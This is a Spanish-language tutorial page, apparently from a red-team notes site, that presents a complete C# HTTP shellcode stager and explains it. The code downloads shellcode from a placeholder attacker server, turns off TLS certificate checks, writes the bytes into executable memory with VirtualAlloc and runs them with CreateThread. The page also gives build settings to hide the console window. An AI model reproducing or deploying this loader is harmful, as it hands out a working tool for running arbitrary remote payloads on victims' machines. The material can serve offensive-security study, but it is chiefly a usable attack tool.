# Stager HTTP C\#

## Código

{% code lineNumbers="true" %}
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Net;

namespace stagerHttp
{
    class Program
    {
        public static void Main(String[] args)
        {
            byte[] shellcode = Download("http://<ip-shellcode-server>:<port>/<shellcode-filename>");
            Execute(shellcode);

            return;
        }

        private static byte[] Download(string url)
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            return shellcode;
        }


        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static void Execute(byte[] shellcode)
        {
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, (IntPtr)(addr), shellcode.Length);


            IntPtr hThread = IntPtr.Zero;
            IntPtr threadId = IntPtr.Zero;
            hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, threadId);

            WaitForSingleObject(hThread, 0xFFFFFFFF);

            return;
        }
    }
}

```
{% endcode %}



## Configuración inicial

Para ocultar la consola hay que seleccionar este campo

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

Para compilar en 64 bytes:

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>



## Explicación

### Función Main

En este bloque lo que hacemos es almacenar lo que la función Download() devuelve en una variable para luego ejecutarla.

```csharp
public static void Main(String[] args)
        {
            byte[] shellcode = Download("http://<ip-shellcode-server>:<port>/<shellcode-filename>");
            Execute(shellcode);

            return;
        }
```



### Función Download

La primer linea de esta función se encarga de que cuando queramos descargar el shellcode no se fije en los errores producidos por https, que si bien podría funcionar sin esto, puede servir en otra situación.

{% embed url="https://learn.microsoft.com/en-us/dotnet/api/system.net.servicepointmanager.servercertificatevalidationcallback?view=net-7.0" %}

Después nos valemos del método **DownloadData()** para descargar como bytes el contenido de lo que le pasemos como url y posteriormente retornarlo.

```csharp
private static byte[] Download(string url)
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            return shellcode;
        }
```

